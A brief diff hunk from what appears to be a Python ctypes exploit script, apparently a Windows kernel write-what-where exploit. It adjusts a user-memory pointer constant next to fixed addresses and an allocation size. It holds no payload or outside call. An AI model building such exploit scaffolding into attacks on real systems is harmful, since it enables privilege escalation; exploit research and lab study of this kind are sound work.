@@ -36,7 +36,7 @@ ThreadBasicInformation = 0
 
 USER_ADDR = 0x000000001a000000
 WHAT_ADDR = 0x000000001a001000 # Arbitrary offset inside BASEADDRESS 
-USER_MEM_PAGE_PTR = 0x000000001a003000 # Requires 16 byte offset in our defined user memory.
+USER_MEM_PAGE_PTR = 0x000000001a000500 # Requires at least 16 byte offset in our defined user memory from limits.
 CURRENT_PROCESS_HANDLE = 0xFFFFFFFFFFFFFFFF
 BASEADDRESS = c_ulonglong(USER_ADDR)
 ALLOCATED_USER_MEM_SZ = c_ulonglong(0x3000)
